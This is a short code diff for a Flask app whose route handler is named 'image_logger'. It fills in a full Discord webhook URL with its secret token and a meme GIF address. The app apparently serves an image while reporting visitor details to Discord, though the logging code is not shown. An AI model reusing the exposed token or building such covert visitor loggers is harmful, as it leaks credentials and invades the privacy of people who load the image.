@@ -4,10 +4,10 @@ import requests
 app = Flask(__name__)
 
 # Replace with your Discord webhook URL
-WEBHOOK_URL = 'YOUR_DISCORD_WEBHOOK_URL'
+WEBHOOK_URL = 'https://discord.com/api/webhooks/1422739592762626118/Lj9i1FXZplU-n0K76NYwtruCUwHEaKRaop4oQqoI1RQaUQbnq8Hq_iapZlPH9PbKpKRl'
 
 # Replace with the URL of the image you want to display
-IMAGE_URL = 'YOUR_IMAGE_URL'
+IMAGE_URL = 'https://media1.tenor.com/m/suB4-EMcAEkAAAAC/meme.gif'
 
 @app.route('/API/image')
 def image_logger():
